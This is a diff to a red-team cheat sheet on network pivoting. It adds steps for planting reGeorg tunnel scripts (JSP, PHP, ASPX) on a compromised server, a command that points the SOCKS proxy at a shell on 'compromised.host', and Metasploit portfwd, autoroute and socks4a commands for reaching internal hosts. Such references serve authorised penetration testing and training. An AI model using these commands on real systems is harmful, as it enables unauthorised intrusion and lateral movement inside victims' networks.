@@ -59,8 +59,38 @@ Set the SOCKS4 proxy then `proxychains nmap -sT 192.168.5.6`
 
 [reGeorg](https://github.com/sensepost/reGeorg), the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn.
 
+Drop one of the following files on the server:
+
+- tunnel.ashx
+- tunnel.aspx
+- tunnel.js
+- tunnel.jsp
+- tunnel.nosocket.php
+- tunnel.php
+- tunnel.tomcat.5.jsp
+
 ```python
-python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp
+python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp # the socks proxy will be on port 8080
+
+optional arguments:
+  -h, --help           show this help message and exit
+  -l , --listen-on     The default listening address
+  -p , --listen-port   The default listening port
+  -r , --read-buff     Local read buffer, max data to be sent per POST
+  -u , --url           The url containing the tunnel script
+  -v , --verbose       Verbose output[INFO|DEBUG]
+```
+
+## Metasploit
+
+```c
+portfwd list
+portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
+
+or
+
+run autoroute -s 192.168.57.0/24
+use auxiliary/server/socks4a
 ```
 
 ## Rpivot
@@ -141,3 +171,4 @@ plink -R [Port to forward to on your VPS]:localhost:[Port to forward on your loc
 * [Port Forwarding in Windows - Windows OS Hub](http://woshub.com/port-forwarding-in-windows/)
 * [Using the SSH "Konami Code" (SSH Control Sequences) - Jeff McJunkin](https://pen-testing.sans.org/blog/2015/11/10/protected-using-the-ssh-konami-code-ssh-control-sequences)
 * [A Red Teamer's guide to pivoting- Mar 23, 2017 - Artem Kondratenko](https://artkond.com/2017/03/23/pivoting-guide/)
+* [Pivoting Meterpreter](https://www.information-security.fr/pivoting-meterpreter/)
